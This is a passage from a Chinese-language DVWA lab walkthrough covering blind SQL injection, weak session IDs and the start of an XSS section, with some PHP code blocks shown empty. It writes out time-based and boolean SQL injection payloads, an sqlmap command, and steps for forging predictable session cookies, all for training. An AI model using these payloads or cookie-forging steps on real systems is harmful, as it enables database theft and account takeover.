	抓包改参数 id 为 `1 and if(length(database())=4,sleep(5),1) #` ,明显延迟,说明数据库名的长度为4个字符;
	抓包改参数 id 为 `1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #` ,明显延迟,说明数据中的第一个表名长度为9个字符;
	抓包改参数 id 为 `1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #` ,明显延迟,说明uers表有8个字段.
**sqlmap**
抓包,把数据存到 1.txt
`sqlmap -r 1.txt`
```
-r 请求文件 从 HTTP 请求文件中加载
```
### High
**服务器端核心代码**
```php
 0 ) {
        // Feedback for end user
        echo 'User ID exists in the database.';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
        // Feedback for end user
        echo 'User ID is MISSING from the database.';
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
可以看到,High 级别的代码利用 cookie 传递参数 id,当 SQL 查询结果为空时,会执行函数 sleep(seconds),目的是为了扰乱基于时间的盲注.同时在 SQL 查询语句中添加了 LIMIT 1,希望以此控制只输出一个结果.
**漏洞利用**
虽然添加了 LIMIT 1,但是我们可以通过 # 将其注释掉.但由于服务器端执行 sleep 函数,会使得基于时间盲注的准确性受到影响,这里我们只演示基于布尔的盲注:
抓包将 cookie 中参数 id 改为 `1' and length(database())=4 #`,显示存在,说明数据库名的长度为4个字符;
抓包将 cookie 中参数 id 改为 `1' and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` ,显示存在,说明数据中的第一个表名长度为9个字符;
抓包将 cookie 中参数 id 改为 `1' and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #` ,(0×7573657273 为users的16进制),显示存在,说明uers表有8个字段.
### Impossible
**服务器端核心代码**
```php
prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo 'User ID exists in the database.';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
            // Feedback for end user
            echo 'User ID is MISSING from the database.';
        }
    }
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```
可以看到,Impossible 级别的代码采用了 PDO 技术,划清了代码与数据的界限,有效防御 SQL 注入,Anti-CSRF token 机制的加入了进一步提高了安全性.
---
## Weak_Session_IDs
密码与证书等认证手段,一般仅仅用于登录(Login)的过程.当登录完成后,用户访问网站的页面,不可能每次浏览器请求页面时,都再使用密码认证一次.因此,当认证完成后,就需要替换一个对用户透明的凭证.这个凭证就是 SessionID.
当用户登录完成后,在服务器端就会创建一个新的会话(Session),会话中会保存用户的状态和相关信息.服务器端维护所有在线用户的 Session,此时的认证,只需要知道是哪个用户在浏览当前的页面即可.为了告诉服务器应该使用哪一个 Session,浏览器需要把当前用户持有的 SessionID 告知服务器.最常见的做法就是把 SessionID 加密后保存在 Cookie 中,因为 Cookie 会随着 HTTP 请求头发送,且受到浏览器同源策略的保护.
SessionID 一旦在生命周期内被窃取,就等同于账户失窃.同时由于 SessionID 是用户登录之后才持有的认证凭证,因此黑客不需要再攻击登录过程(比如密码).Session 劫持就是一种通过窃取用户 SessionID 后,使用该 SessionID 登录进目标账户的攻击方法,此时攻击者实际上是使用了目标账户的有效 Session.如果 SessionID 是保存在 Cookie 中的,则这种攻击可以称为 Cookie 劫持.SessionID 还可以保存在 URL 中,作为一个请求的一个参数,但是这种方式的安全性难以经受考验.
因此,在生成 SessionID 时,需要保证足够的随机性,比如采用足够强的伪随机数生成算法.
**SessionID 利用的实质**
SessionID 是在登录后,作为特定用户访问站点所需的唯一内容.如果能够计算或轻易猜到该 SessionID,则攻击者将可以轻易获取访问权限,无需登录密码直接进入特定用户界面,进而查找其他漏洞如 XSS、文件上传等等.
此模块使用四种不同的方式来设置 dvwaSession 的 cookie 值,每个级别的目标是计算 ID 的生成方式,然后推断其他管理员用户的 ID.
### Low
**服务器端核心代码**
```php
```
可以看出,dvwaSession 是从 0 开始的,每次加 1.
**漏洞利用**
模拟管理员登录,在浏览器 1 里,点击 Generate,Burpsuite 抓包,发送到 Repeater,go 一次
请求头中:
> Cookie: dvwaSession=17; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
响应头中:
> Set-Cookie: dvwaSession=18
多 go 几次,发现 dvwaSession 一直增加,每次加 1.
恶意攻击者通过寻找到上述规律,使用浏览器 2,成功构造出 payload:
> Cookie: dvwaSession=18; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
`注:这里的 cookie 值要根据你自己的 dvwaSession 去计算`
在无密码认证的情况下,成功登录到界面:
`http:///vulnerabilities/weak_id/`
### Medium
**服务器端核心代码**
```php
```
由代码可知,cookie 的值由时间而得
**漏洞利用**
模拟管理员登录,在浏览器 1 里,点击 Generate,burp 里发现:
请求头中:
> Cookie: dvwaSession=19; security=medium; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
响应头中:
> Set-Cookie: dvwaSession=1561346895
多 go 几次,发现 dvwaSession 和时间戳变化一致.在此,建议自行搜索 `unix时间戳`
恶意攻击者通过寻找到上述规律,使用浏览器 2,成功构造出 payload:
> Cookie: dvwaSession=1561347450; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2; security=medium
`注:这里的 cookie 值要根据你自己的当前时间去算出来`
在无密码认证的情况下,成功登录到界面:
`http:///vulnerabilities/weak_id/`
### High
**服务器端核心代码**
```php
```
- **PHP setcookie()函数**
	`setcookie(name,value,expire,path,domain,secure,httponly)`
	| 参数     | 描述                                       |
	| :------- | :---------------------------------------- |
	| name     | 必需.规定cookie的名称.                     |
	| value    | 必需.规定cookie的值.                      |
	| expire   | 可选.规定cookie的有效期.                   |
	| path     | 可选.规定cookie的服务器路径.                |
	| domain   | 可选.规定cookie的域名.                     |
	| secure   | 可选.规定是否通过安全的HTTPS连接来传输cookie. |
	| httponly | 可选.规定是否Cookie仅可通过HTTP协议访问.     |
	由源码可知:
	```
	value 值:last_session_id_high 自增 1,再用 md5 加密
	expire 值:当前时间再加一个小时
	path 值:/vulnerabilities/weak_id/
	```
**漏洞利用**
模拟管理员登录,在浏览器 1 里,点击 Generate,burp 里发现:
请求头中:
> Cookie: dvwaSession=19; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
响应头中:
> Set-Cookie: dvwaSession=c4ca4238a0b923820dcc509a6f75849b; expires=Mon, 24-Jun-2019 04:56:58 GMT;
多 go 几次,发现 dvwaSession 值通过 MD5 加密.将每次产生的 MD5 解密,发现解密后的值,发现和低等级中的代码一样,是从 0 开始加的.
恶意攻击者通过寻找到上述规律,使用浏览器 2,成功构造出 payload:
> Cookie: dvwaSession=1F0E3DAD99908345F7439F8FFABDFFC4; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
`注:这里的 cookie 值要根据你自己的 dvwaSession 去计算 md5`
`http:///vulnerabilities/weak_id/`
### Impossible
**服务器端核心代码**
```php
```
$cookie_value 采用随机数+时间戳+固定字符串"Impossible",再进行 sha1 运算,完全不能猜测到 dvwaSession 的值.实现了用户安全会话认证.
---
## XSS
XSS,全称 Cross Site Scripting,即跨站脚本攻击,某种意义上也是一种注入攻击,是指攻击者在页面中注入恶意的脚本代码,当受害者访问该页面时,恶意代码会在其浏览器上执行,需要强调的是,XSS 不仅仅限于 JavaScript,还包括 flash等其它脚本语言.根据恶意代码是否存储在服务器中,XSS 可以分为存储型的XSS与反射型的XSS.
DOM型的XSS由于其特殊性,常常被分为第三种,这是一种基于DOM树的XSS.例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面,如果这些函数在引用某些变量时没有进行过滤或检查,就会产生DOM型的XSS.DOM型XSS可能是存储型,也有可能是反射型.
### XSS(DOM)
DOM,全称 Document Object Model,是一个平台和语言都中立的接口,可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式.
DOM 型 XSS 其实是一种特殊类型的反射型 XSS,它是基于 DOM 文档对象模型的一种漏洞.
在网站页面中有许多页面的元素,当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象,接着生成各个子文档对象,每个页面元素对应一个文档对象,每个文档对象包含属性、方法和事件.可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素.也就是说,客户端的脚本程序可以通过 DOM 来动态修改页面内容,从客户端获取 DOM 中的数据并在本地执行.基于这个特性,就可以利用 JS 脚本来实现 XSS 漏洞的利用.
可能触发 DOM 型 XSS 的属性
```